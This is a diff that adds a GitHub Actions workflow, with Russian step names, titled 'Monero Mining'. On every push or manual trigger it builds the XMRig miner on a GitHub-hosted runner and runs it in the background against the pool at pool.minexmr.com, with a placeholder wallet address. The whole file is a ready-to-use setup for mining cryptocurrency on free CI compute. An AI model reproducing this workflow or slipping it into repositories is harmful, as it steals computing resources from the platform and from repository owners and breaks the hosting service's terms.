@@ -1,0 +1,22 @@
+
+name: Monero Mining
+
+on: [push, workflow_dispatch]
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Установка XMRig
+        run: |
+          sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build && cd build
+          cmake ..
+          make -j$(nproc)
+      
+      - name: Запуск XMRig
+        run: |
+          cd xmrig/build
+          ./xmrig -o pool.minexmr.com:443 -u ТВОЙ_MONERO_АДРЕС -p x --tls --background
